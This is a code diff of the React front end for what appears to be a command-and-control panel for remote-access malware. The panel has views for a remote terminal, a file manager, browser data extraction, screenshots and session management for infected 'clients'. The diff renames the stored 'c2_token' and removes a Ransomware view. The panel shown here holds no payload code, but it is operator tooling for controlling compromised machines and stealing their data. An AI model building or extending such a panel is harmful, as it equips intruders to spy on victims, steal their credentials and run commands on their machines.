@@ -7,13 +7,12 @@ import Header from './components/Header';
 import Login from './components/Login';
 import Sidebar from './components/Sidebar';
 import Dashboard from './components/Dashboard';
-import Clients from './components/Clients';
+import SessionView from './components/SessionView';
 import Terminal from './components/Terminal';
 import FileManager from './components/FileManager';
 import BrowserExtractor from './components/BrowserExtractor';
-import Ransomware from './components/Ransomware';
 import Screenshots from './components/Screenshots';
-import Settings from './components/Settings';
+import UserManagement from './components/UserManagement';
 
 import { useSocket } from './hooks/useSocket';
 import { useClients } from './hooks/useClients';
@@ -22,7 +21,18 @@ function App() {
   const [sidebarOpen, setSidebarOpen] = useState(true);
   const [currentView, setCurrentView] = useState('dashboard');
   const [selectedClient, setSelectedClient] = useState(null);
-  const [token, setToken] = useState(() => localStorage.getItem('c2_token') || '');
+  const [selectedSession, setSelectedSession] = useState(null);
+  const [token, setToken] = useState(() => {
+    const next = localStorage.getItem('fahis_token');
+    if (next) return next;
+    const legacy = localStorage.getItem('c2_token');
+    if (legacy) {
+      localStorage.setItem('fahis_token', legacy);
+      localStorage.removeItem('c2_token');
+      return legacy;
+    }
+    return '';
+  });
 
   const socket = useSocket(token);
   const { clients, loading, error } = useClients(socket);
@@ -33,27 +43,41 @@ function App() {
 
   const handleClientSelect = (client) => {
     setSelectedClient(client);
-    setCurrentView('terminal');
+    setCurrentView('session');
+  };
+
+  const handleSessionSelect = (session) => {
+    setSelectedSession(session);
+    setSelectedClient(session);
+    setCurrentView('session');
   };
 
   const renderCurrentView = () => {
     switch (currentView) {
       case 'dashboard':
-        return <Dashboard clients={clients} onClientSelect={handleClientSelect} />;
-      case 'clients':
-        return <Clients 
-          clients={clients} 
-          onClientSelect={(client) => {
-            setSelectedClient(client);
-            setCurrentView('files');
-          }}
-          onDeleteClient={(clientId) => {
-            try {
-              if (socket && typeof socket.emit === 'function') {
-                socket.emit('deleteClient', { clientId });
+        return (
+          <Dashboard
+            clients={clients}
+            onSessionSelect={handleSessionSelect}
+            onDeleteSession={(client) => {
+              try {
+                if (socket && typeof socket.emit === 'function') {
+                  socket.emit('deleteClient', { clientId: client.id });
+                }
+              } catch (e) {}
+              if (selectedSession?.id === client.id) {
+                setSelectedSession(null);
+                setSelectedClient(null);
+                setCurrentView('dashboard');
               }
-            } catch (e) {}
-          }}
+            }}
+          />
+        );
+      case 'session':
+        return <SessionView 
+          session={selectedSession} 
+          onBack={() => setCurrentView('dashboard')}
+          socket={socket}
         />;
       case 'terminal':
         return <Terminal client={selectedClient} socket={socket} />;
@@ -61,14 +85,24 @@ function App() {
         return <FileManager client={selectedClient} socket={socket} />;
       case 'browser':
         return <BrowserExtractor client={selectedClient} socket={socket} />;
-      case 'ransomware':
-        return <Ransomware client={selectedClient} socket={socket} />;
       case 'screenshots':
         return <Screenshots client={selectedClient} socket={socket} />;
-      case 'settings':
-        return <Settings />;
+      case 'users':
+        return <UserManagement />;
       default:
-        return <Dashboard clients={clients} onClientSelect={handleClientSelect} />;
+        return (
+          <Dashboard
+            clients={clients}
+            onSessionSelect={handleSessionSelect}
+            onDeleteSession={(client) => {
+              try {
+                if (socket && typeof socket.emit === 'function') {
+                  socket.emit('deleteClient', { clientId: client.id });
+                }
+              } catch (e) {}
+            }}
+          />
+        );
     }
   };
 
@@ -85,18 +119,18 @@ function App() {
           currentView={currentView}
           selectedClient={selectedClient}
           onLogout={() => {
-            try { localStorage.removeItem('c2_token'); } catch (e) {}
+            try { localStorage.removeItem('fahis_token'); } catch (e) {}
             setToken('');
           }}
         />
         
-        <div className="main-content" style={{ display: 'flex', height: 'calc(100vh - 60px)', marginTop: '60px' }}>
+        <div className="main-content" style={{ display: 'flex', height: 'calc(100vh - 64px)', marginTop: '64px' }}>
           <Sidebar 
             open={sidebarOpen}
             currentView={currentView}
             onViewChange={setCurrentView}
             clients={clients}
-            onClientSelect={handleClientSelect}
+            onSessionSelect={handleSessionSelect}
           />
           
           <main 
@@ -105,9 +139,9 @@ function App() {
               flex: 1,
               padding: '20px',
               overflow: 'auto',
-              backgroundColor: '#0a0a0a',
-              transition: 'margin-left 0.3s ease',
-              marginLeft: sidebarOpen ? 280 : 0
+              backgroundColor: 'transparent',
+              transition: 'margin-left 0.28s ease',
+              marginLeft: sidebarOpen ? 260 : 0
             }}
           >
             {renderCurrentView()}
